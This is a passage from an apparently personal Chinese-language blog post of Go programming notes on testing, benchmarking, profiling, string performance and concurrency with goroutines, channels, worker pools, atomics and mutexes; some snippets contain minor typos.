href="https://github.com/jarcoal/httpmock" target="_blank" rel="noopener">httpmock</a>：处理依赖的 HTTP 请求；</li><li><a href="https://github.com/bouk/monkey" target="_blank" rel="noopener">monkey</a>：万能的方法，但是只在万不得已时使用，类似的代码写起来非常冗长而且不直观；</li></ul></li><li>断言：使用社区的 <a href="https://github.com/stretchr/testify" target="_blank" rel="noopener">testify</a> 快速验证方法的返回值；</li></ul><p><strong>命名约定</strong></p><ul><li><p>测试用例文件名必须以 <code>_test.go</code> 结尾。</p></li><li><p>测试函数必须以 <code>Test</code> 开头</p></li></ul><ul><li>测试函数只接受一个 <code>t *testing.T</code> 参数。</li></ul><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// hello_test.go</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">"testing"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestHello</span><span class="params">(t *testing.T)</span></span> &#123;</span><br><span class="line">    assertCorrectMessage := <span class="function"><span class="keyword">func</span><span class="params">(t *testing.T, got <span class="keyword">string</span>, want <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">    t.Helper()  <span class="comment">// 声明是辅助函数</span></span><br><span class="line">    <span class="keyword">if</span> got != want &#123;</span><br><span class="line">    t.Errorf(<span class="string">"want %q got %q"</span>, want, got)</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    t.Run(<span class="string">"saying hello to people"</span>, <span class="function"><span class="keyword">func</span><span class="params">(t *testing.T)</span></span> &#123;</span><br><span class="line">    got := Hello(<span class="string">"wywwzj"</span>)</span><br><span class="line">    want := <span class="string">"Hello, wywwzjj"</span></span><br><span class="line">    assertCorrectMessage(t, got, want)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    t.Run(<span class="string">"empty string defaults to 'world'"</span>, <span class="function"><span class="keyword">func</span><span class="params">(t *testing.T)</span></span> &#123;</span><br><span class="line">    want := <span class="string">"Hello, world"</span></span><br><span class="line">    got := Hello(<span class="string">""</span>)</span><br><span class="line">    assertCorrectMessage(t, got, want)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 表格式测试（Goland 可直接生成）</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestFib</span><span class="params">(t *testing.T)</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> fibTests = []<span class="keyword">struct</span> &#123;</span><br><span class="line">        in       <span class="keyword">int</span> <span class="comment">// input</span></span><br><span class="line">        expected <span class="keyword">int</span> <span class="comment">// expected result</span></span><br><span class="line">    &#125;&#123;</span><br><span class="line">        &#123;<span class="number">1</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="number">2</span>, <span class="number">1</span>&#125;,</span><br><span class="line">        &#123;<span class="number">3</span>, <span class="number">2</span>&#125;,</span><br><span class="line">        &#123;<span class="number">4</span>, <span class="number">3</span>&#125;,</span><br><span class="line">        &#123;<span class="number">5</span>, <span class="number">5</span>&#125;,</span><br><span class="line">        &#123;<span class="number">6</span>, <span class="number">8</span>&#125;,</span><br><span class="line">        &#123;<span class="number">7</span>, <span class="number">13</span>&#125;,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _, tt := <span class="keyword">range</span> fibTests &#123;</span><br><span class="line">        actual := Fib(tt.in)</span><br><span class="line">        <span class="keyword">if</span> actual != tt.expected &#123;</span><br><span class="line">            t.Errorf(<span class="string">"Fib(%d) = %d; expected %d"</span>, tt.in, actual, tt.expected)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试并发中的条件竞争</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">go test -race</span><br></pre></td></tr></table></figure><h4 id="example"><a href="#example" class="headerlink" title="example"></a>example</h4><p>既能生成文档，也是做了一次测试。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Example_GetScore</span><span class="params">()</span></span> &#123;</span><br><span class="line">    score := getScore(<span class="number">100</span>, <span class="number">100</span>, <span class="number">100</span>, <span class="number">2.1</span>)</span><br><span class="line">    fmt.Println(score)</span><br><span class="line">    <span class="comment">// Output:</span></span><br><span class="line">    <span class="comment">// 31.1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="testing-的变量"><a href="#testing-的变量" class="headerlink" title="testing 的变量"></a>testing 的变量</h4><p>gotest 的变量有这些：</p><ul><li>test.short : 一个快速测试的标记，在测试用例中可以使用 testing.Short () 来绕开一些测试</li><li>test.outputdir : 输出目录</li><li>test.coverprofile : 测试覆盖率参数，指定输出文件</li><li>test.run : 指定正则来运行某个 / 某些测试用例</li><li>test.memprofile : 内存分析参数，指定输出文件</li><li>test.memprofilerate : 内存分析参数，内存分析的抽样率</li><li>test.cpuprofile : cpu 分析输出参数，为空则不做 cpu 分析</li><li>test.blockprofile : 阻塞事件的分析参数，指定输出文件</li><li>test.blockprofilerate : 阻塞事件的分析参数，指定抽样频率</li><li>test.timeout : 超时时间</li><li>test.cpu : 指定 cpu 数量</li><li>test.parallel : 指定运行测试用例的并行数</li></ul><h4 id="testing-包内的结构"><a href="#testing-包内的结构" class="headerlink" title="testing 包内的结构"></a>testing 包内的结构</h4><ul><li>B : 压力测试</li><li>BenchmarkResult : 压力测试结果</li><li>Cover : 代码覆盖率相关结构体</li><li>CoverBlock : 代码覆盖率相关结构体</li><li>InternalBenchmark : 内部使用的结构</li><li>InternalExample : 内部使用的结构</li><li>InternalTest : 内部使用的结构</li><li>M : main 测试使用的结构</li><li>PB : Parallel benchmarks 并行测试使用结果</li><li>T : 普通测试用例</li><li>TB : 测试用例的接口</li></ul><h4 id="testing-的通用方法"><a href="#testing-的通用方法" class="headerlink" title="testing 的通用方法"></a>testing 的通用方法</h4><p>T 结构内部是继承自 common 结构，common 结构提供集中方法，是我们经常会用到的：</p><p>当我们遇到一个断言错误的时候，我们就会判断这个测试用例失败，就会使用到：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Fail  : case 失败，测试用例继续</span><br><span class="line">FailedNow : case 失败，测试用例中断</span><br></pre></td></tr></table></figure><p>当我们遇到一个断言错误，只希望跳过这个错误，但是不希望标示测试用例失败，会使用到：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SkipNow : case 跳过，测试用例不继续</span><br></pre></td></tr></table></figure><p>当我们只希望在一个地方打印出信息，我们会用到 :</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Log : 输出信息</span><br><span class="line">Logf : 输出有 format 的信息</span><br></pre></td></tr></table></figure><p>当我们希望跳过这个用例，并且打印出信息 :</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Skip : Log + SkipNow</span><br><span class="line">Skipf : Logf + SkipNow</span><br></pre></td></tr></table></figure><p>当我们希望断言失败的时候，测试用例失败，打印出必要的信息，但是测试用例继续：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Error : Log + Fail</span><br><span class="line">Errorf : Logf + Fail</span><br></pre></td></tr></table></figure><p>当我们希望断言失败的时候，测试用例失败，打印出必要的信息，测试用例中断：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Fatal : Log + FailNow</span><br><span class="line">Fatalf : Logf + FailNow</span><br></pre></td></tr></table></figure><h3 id="基准测试"><a href="#基准测试" class="headerlink" title="基准测试"></a>基准测试</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 基准测试，go test -bench=.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">BenchmarkHello</span><span class="params">(t testing.B)</span></span> &#123;</span><br><span class="line">    b.ResetTimer()  <span class="comment">// 如果在运行前基准测试需要一些耗时的配置，则可以先重置定时器</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; b.N; i++ &#123;</span><br><span class="line">        Hello();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// BenchmarkHello    10000000    282 ns/op</span></span><br><span class="line"><span class="comment">// 意思是执行 10000000 次，每次执行需要 282 纳秒。</span></span><br></pre></td></tr></table></figure><h3 id="测试-http-服务器"><a href="#测试-http-服务器" class="headerlink" title="测试 http 服务器"></a>测试 http 服务器</h3><h3 id="httptest"><a href="#httptest" class="headerlink" title="httptest"></a>httptest</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">server := httptest.NewServer(http.HandlerFunc(<span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">    w.WriteHeader(http.StatusOK)</span><br><span class="line">    &#125;))</span><br><span class="line"></span><br><span class="line">server.URL</span><br></pre></td></tr></table></figure><p>#### </p><h3 id="代码覆盖率和性能测试"><a href="#代码覆盖率和性能测试" class="headerlink" title="代码覆盖率和性能测试"></a>代码覆盖率和性能测试</h3><h3 id="pprof"><a href="#pprof" class="headerlink" title="pprof"></a>pprof</h3><p>runtime/pprof</p><p>net/http/pprof</p><p><strong>runtime/trace</strong></p><p>只需在程序执行前加上环境变量 GODEBUG=gctrace=1</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GODEBUG=gctrace=1 go test -bench=.</span><br><span class="line">GODEBUG=gctrace=1 go run main.go</span><br></pre></td></tr></table></figure><h3 id="生成文档和示例代码"><a href="#生成文档和示例代码" class="headerlink" title="生成文档和示例代码"></a>生成文档和示例代码</h3><h3 id="性能调优分析指标"><a href="#性能调优分析指标" class="headerlink" title="性能调优分析指标"></a>性能调优分析指标</h3><ul><li>Wall Time</li><li>CPU Time</li><li>Block Time</li><li>Memory allocation</li><li>GC times / time spent</li></ul><h3 id="别让性能被锁住"><a href="#别让性能被锁住" class="headerlink" title="别让性能被锁住"></a>别让性能被锁住</h3><h3 id="高效字符串连接"><a href="#高效字符串连接" class="headerlink" title="高效字符串连接"></a>高效字符串连接</h3><p>字符串是不可变对象，已经生成不能改变，每次改变都是产生了一个新的字符串。</p><ul><li><p>string.Builder 性能最好</p>  <figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> builder strings.Builder</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; b.N; i++ &#123;</span><br><span class="line">    builder.WriteString(strconv.Itoa(i))</span><br><span class="line">&#125;</span><br><span class="line">str := builder.String()</span><br></pre></td></tr></table></figure></li><li><p>bytes.Buffer 次之</p>  <figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> buf bytes.Buffer</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; b.N; i++ &#123;</span><br><span class="line">    buf.WriteString(strconv.Itoa(i))</span><br><span class="line">&#125;</span><br><span class="line">str := buf.String()</span><br></pre></td></tr></table></figure></li><li><p><code>+</code></p></li><li><p>sprintf 最慢</p>  <figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> s <span class="keyword">string</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; b.N; i++ &#123;</span><br><span class="line">    s = fmt.Sprintf(<span class="string">"%v%v"</span>, s, i)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="GC-友好"><a href="#GC-友好" class="headerlink" title="GC 友好"></a>GC 友好</h3><h4 id="避免内存分配和复制"><a href="#避免内存分配和复制" class="headerlink" title="避免内存分配和复制"></a>避免内存分配和复制</h4><ul><li><p>复杂对象尽量传引用</p><ul><li>数组的传递</li><li>结构体传递</li></ul></li><li><p>复用内存</p><p>  slice 初始化合适的大小。</p></li></ul><h2 id="并发编程"><a href="#并发编程" class="headerlink" title="并发编程"></a>并发编程</h2><blockquote><p><a href="https://github.com/golang/go/wiki/LearnConcurrency" target="_blank" rel="noopener">https://github.com/golang/go/wiki/LearnConcurrency</a></p></blockquote><p>Go 实现了 CSP（通信顺序进程，Communicaing Sequential Process）模型来作为 goroutine 间的推荐通信方式</p><h3 id="Goroutine"><a href="#Goroutine" class="headerlink" title="Goroutine"></a>Goroutine</h3><p><strong>MPG模式</strong></p><p>M：操作系统的主线程（物理线程）</p><p>P：协程执行需要的上下文</p><p>G：协程</p><p>如果协程中出现了 panic，则整个程序都会崩溃。</p><p>设置运行 CPU 数量</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">num := runtime.NumCPU()  <span class="comment">// 获取系统的逻辑CPU个数</span></span><br><span class="line">runtime.GOMAXPROCS(<span class="number">233</span>)  <span class="comment">// 指定数量，go 1.8 后默认运行在多核上</span></span><br></pre></td></tr></table></figure><h3 id="channel"><a href="#channel" class="headerlink" title="channel"></a>channel</h3><blockquote><p>不要通过共享内存来通信，而应通过通信来共享内存。</p></blockquote><p>类似 Unix 下的双向管道，可指定单向，用于goroutine 之间通信，可传送任意数据类型。符号为 <code>&lt;- chan &lt;-</code>。</p><p>线程安全，多 goroutine 访问时，不需要加锁，即本身就是线程安全的。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// goroutine 与 main 通信</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    channel := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">string</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        channel &lt;- <span class="string">"Hello"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main 函数所处的是一个主 goroutine，由 runtime.main 启动。</p><p>main 函数一旦运行结束退出，其他的 goroutine 会被杀掉。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">channel := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>, <span class="number">3</span>)  <span class="comment">// 3 buffer</span></span><br></pre></td></tr></table></figure><p>channel 默认是阻塞的，满了阻塞写，空了阻塞读。</p><p>获取 channel 内容可使用 range 遍历，但发送方 channel 要手动 close 一下。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 我们将遍历在 `queue` 通道中的两个值。</span></span><br><span class="line">queue := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">string</span>, <span class="number">2</span>)</span><br><span class="line">queue &lt;- <span class="string">"one"</span></span><br><span class="line">queue &lt;- <span class="string">"two"</span></span><br><span class="line"><span class="built_in">close</span>(queue)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这个 `range` 迭代从 `queue` 中得到的每个值。因为我们在前面 `close` 了这个通道，这个迭代会在接收完 2 个值之后结束。</span></span><br><span class="line"><span class="comment">// 如果我们没有 `close` 它，我们将在这个循环中继续阻塞执行，等待接收第三个值</span></span><br><span class="line"><span class="keyword">for</span> elem := <span class="keyword">range</span> queue &#123;</span><br><span class="line">    fmt.Println(elem)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Go 中的 select</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// for 指定次数</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">2</span>; i++ &#123;</span><br><span class="line">    <span class="keyword">select</span> &#123;</span><br><span class="line">        <span class="keyword">case</span> msg1 := &lt;- c1:</span><br><span class="line">        <span class="comment">// xx</span></span><br><span class="line">    <span class="keyword">case</span> msg2 := &lt;- c2:</span><br><span class="line">        <span class="comment">// xx</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设定 timeout</span></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">    timeout_cnt := <span class="number">0</span></span><br><span class="line">    <span class="keyword">select</span> &#123;</span><br><span class="line">        <span class="keyword">case</span> msg1 := &lt;- c1:</span><br><span class="line">        <span class="comment">// xx</span></span><br><span class="line">        <span class="keyword">case</span> msg2 := &lt;- c2:</span><br><span class="line">        <span class="comment">// xx</span></span><br><span class="line">        <span class="keyword">case</span> &lt;- time.After(time.Second * <span class="number">30</span>):</span><br><span class="line">        timeout_cnt++</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> time_cnt &gt; <span class="number">3</span> &#123;</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 无阻塞 channel</span></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">    <span class="keyword">select</span> &#123;</span><br><span class="line">        <span class="keyword">case</span> msg1 := &lt;- c1:</span><br><span class="line">        <span class="comment">// xx</span></span><br><span class="line">        <span class="keyword">case</span> msg2 := &lt;- c2:</span><br><span class="line">        <span class="comment">// xx</span></span><br><span class="line">        <span class="keyword">default</span>: <span class="comment">// 加入 default 后无阻塞</span></span><br><span class="line">        <span class="comment">// xx</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭 channel，channel 会返回两个值，一个是内容，一个是还有没有内容</span></span><br><span class="line"><span class="built_in">close</span>(channel)</span><br><span class="line"></span><br><span class="line">more := <span class="literal">true</span></span><br><span class="line"><span class="keyword">for</span> more &#123;</span><br><span class="line">    <span class="keyword">select</span> &#123;</span><br><span class="line">        <span class="keyword">case</span> msg, more = &lt;- channel:</span><br><span class="line">            <span class="keyword">if</span> more &#123;</span><br><span class="line">    <span class="comment">// xx</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// xx</span></span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> sem = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>, MaxOutstanding)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">handle</span><span class="params">(r *Request)</span></span> &#123;</span><br><span class="line">    sem &lt;- <span class="number">1</span>    <span class="comment">// 等待活动队列清空。</span></span><br><span class="line">    process(r)  <span class="comment">// 可能需要很长时间。</span></span><br><span class="line">    &lt;-sem       <span class="comment">// 完成；使下一个请求可以运行。</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Serve</span><span class="params">(queue <span class="keyword">chan</span> *Request)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        req := &lt;-queue</span><br><span class="line">        <span class="keyword">go</span> handle(req)  <span class="comment">// 无需等待 handle 结束。</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 队列满了，依然开了 goroutine，改进</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Serve</span><span class="params">(queue <span class="keyword">chan</span> *Request)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        req := &lt;-queue</span><br><span class="line">        sem &lt;- <span class="number">1</span></span><br><span class="line">        <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">            process(req)</span><br><span class="line">            &lt;- sem</span><br><span class="line">        &#125;()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// req 在所有 goroutine 中共享，一旦改变就容易出错</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Serve</span><span class="params">(queue <span class="keyword">chan</span> *Request)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        req := &lt;-queue</span><br><span class="line">        sem &lt;- <span class="number">1</span></span><br><span class="line">        <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(req *Request)</span></span> &#123;</span><br><span class="line">            process(req)</span><br><span class="line">            &lt;- sem</span><br><span class="line">        &#125;(req)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 利用闭包</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Serve</span><span class="params">(queue <span class="keyword">chan</span> *Request)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> req := <span class="keyword">range</span> queue &#123;</span><br><span class="line">        req := req  <span class="comment">// 用相同的名字获得了该变量的一个新的版本， 以此来局部地刻意屏蔽循环变量，使它对每个 Go 协程保持唯一</span></span><br><span class="line">        sem &lt;- <span class="number">1</span></span><br><span class="line">        <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">            process(req)</span><br><span class="line">            &lt;- sem</span><br><span class="line">        &#125;()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="理解调度器"><a href="#理解调度器" class="headerlink" title="理解调度器"></a>理解调度器</h3><h3 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">"time"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 这是我们将要在多个并发实例中支持的任务了。</span></span><br><span class="line"><span class="comment">// 这些执行者将从 `jobs` 通道接收任务，并且通过 `results` 发送对应的结果。</span></span><br><span class="line"><span class="comment">// 我们将让每个任务间隔 1s 来模仿一个耗时的任务。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">worker</span><span class="params">(id <span class="keyword">int</span>, jobs &lt;-<span class="keyword">chan</span> <span class="keyword">int</span>, results <span class="keyword">chan</span>&lt;- <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> j := <span class="keyword">range</span> jobs &#123;</span><br><span class="line">        fmt.Println(<span class="string">"worker"</span>, id, <span class="string">"processing job"</span>, j)</span><br><span class="line">        time.Sleep(time.Second)</span><br><span class="line">        results &lt;- j * <span class="number">2</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 为了使用 worker 线程池并且收集他们的结果，我们需要 2 个通道。</span></span><br><span class="line">    jobs := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>, <span class="number">100</span>)</span><br><span class="line">    results := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>, <span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这里启动了 3 个 worker，初始是阻塞的，因为还没有传递任务。</span></span><br><span class="line">    <span class="keyword">for</span> w := <span class="number">1</span>; w &lt;= <span class="number">3</span>; w++ &#123;</span><br><span class="line">        <span class="keyword">go</span> worker(w, jobs, results)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这里我们发送 9 个 `jobs`，然后 `close` 这些通道来表示这些就是所有的任务了。</span></span><br><span class="line">    <span class="keyword">for</span> j := <span class="number">1</span>; j &lt;= <span class="number">9</span>; j++ &#123;</span><br><span class="line">        jobs &lt;- j</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">close</span>(jobs)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 最后，我们收集所有这些任务的返回值。</span></span><br><span class="line">    <span class="keyword">for</span> a := <span class="number">1</span>; a &lt;= <span class="number">9</span>; a++ &#123;</span><br><span class="line">        &lt;-results</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="runtime"><a href="#runtime" class="headerlink" title="runtime"></a>runtime</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">runtime.Gosched()  <span class="comment">// 运行其他协程执行</span></span><br></pre></td></tr></table></figure><h3 id="context"><a href="#context" class="headerlink" title="context"></a>context</h3><h3 id="原子操作"><a href="#原子操作" class="headerlink" title="原子操作"></a>原子操作</h3><p>这样的函数还有很多，参看 <a href="http://golang.org/pkg/sync/atomic/" target="_blank" rel="noopener">go 的 atomic 包文档</a></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">imort &quot;sync/atomic&quot;</span><br><span class="line"></span><br><span class="line">var cnt uint32 = 0</span><br><span class="line">atomic.AddUint32(&amp;cnt, 1)</span><br><span class="line"></span><br><span class="line">cntFinal := atomic.LoadUint32(&amp;cnt)  // 取数据</span><br></pre></td></tr></table></figure><h3 id="互斥锁-Mutex"><a href="#互斥锁-Mutex" class="headerlink" title="互斥锁 Mutex"></a>互斥锁 Mutex</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> memoryAccess sync.Mutex</span><br><span class="line"><span class="keyword">var</span> value <span class="keyword">int</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">    memoryAccess.Lock()</span><br><span class="line">    value++</span><br><span class="line">    memoryAccess.Unlock()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">memoryAccess.Lock()</span><br><span class="line"><span class="keyword">if</span> value == <span class="number">0</span> &#123;</span><br><span class="line">    <span class="built_in">println</span>(value)</span><br><span class="line">&#125;</span><br><span class="line">memoryAccess.Unlock()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在我们的例子中，`state` 是一个 map。</span></span><br><span class="line">    <span class="keyword">var</span> state = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这里的 `mutex` 将同步对 `state` 的访问。</span></span><br><span class="line">    <span class="keyword">var</span> mutex = &amp;sync.Mutex&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// we'll see later, `ops` will count how many</span></span><br><span class="line">    <span class="comment">// operations we perform against the state.</span></span><br><span class="line">    <span class="comment">// 为了比较基于互斥锁的处理方式和我们后面将要看到的其他</span></span><br><span class="line">    <span class="comment">// 方式，`ops` 将记录我们对 state 的操作次数。</span></span><br><span class="line">    <span class="keyword">var</span> ops <span class="keyword">int64</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这里我们运行 100 个 Go 协程来重复读取 state。</span></span><br><span class="line">    <span class="keyword">for</span> r := <span class="number">0</span>; r &lt; <span class="number">100</span>; r++ &#123;</span><br><span class="line">        <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">            total := <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 每次循环读取，我们使用一个键来进行访问，</span></span><br><span class="line">                <span class="comment">// `Lock()` 这个 `mutex` 来确保对 `state` 的</span></span><br><span class="line">                <span class="comment">// 独占访问，读取选定的键的值，`Unlock()` 这个</span></span><br><span class="line">                <span class="comment">// mutex，并且 `ops` 值加 1。</span></span><br><span class="line">                key := rand.Intn(<span class="number">5</span>)</span><br><span class="line">                mutex.Lock()</span><br><span class="line">                total += state[key]</span><br><span class="line">                mutex.Unlock()</span><br><span class="line">                atomic.AddInt64(&amp;ops, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 为了确保这个 Go 协程不会在调度中饿死，我们</span></span><br><span class="line">                <span class="comment">// 在每次操作后明确的使用 `runtime.Gosched()`</span></span><br><span class="line">                <span class="comment">// 进行释放。这个释放一般是自动处理的，像例如</span></span><br><span class="line">                <span class="comment">// 每个通道操作后或者 `time.Sleep` 的阻塞调用后</span></span><br><span class="line">                <span class="comment">// 相似，但是在这个例子中我们需要手动的处理。</span></span><br><span class="line">                runtime.Gosched()</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 同样的，我们运行 10 个 Go 协程来模拟写入操作，使用</span></span><br><span class="line">    <span class="comment">// 和读取相同的模式。</span></span><br><span class="line">    <span class="keyword">for</span> w := <span class="number">0</span>; w &lt; <span class="number">10</span>; w++ &#123;</span><br><span class="line">        <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">            <span class="keyword">for</span> &#123;</span><br><span class="line">                key := rand.Intn(<span class="number">5</span>)</span><br><span class="line">                val := rand.Intn(<span class="number">100</span>)</span><br><span class="line">                mutex.Lock()</span><br><span class="line">                state[key] = val</span><br><span class="line">                mutex.Unlock()</span><br><span class="line">                atomic.AddInt64(&amp;ops, <span class="number">1</span>)</span><br><span class="line">                runtime.Gosched()</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 让这 10 个 Go 协程对 `state` 和 `mutex` 的操作</span></span><br><span class="line">    <span class="comment">// 运行 1 s。</span></span><br><span class="line">    time.Sleep(time.Second)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取并输出最终的操作计数。</span></span><br><span class="line">    opsFinal := atomic.LoadInt64(&amp;ops)</span><br><span class="line">    fmt.Println(<span class="string">"ops:"</span>, 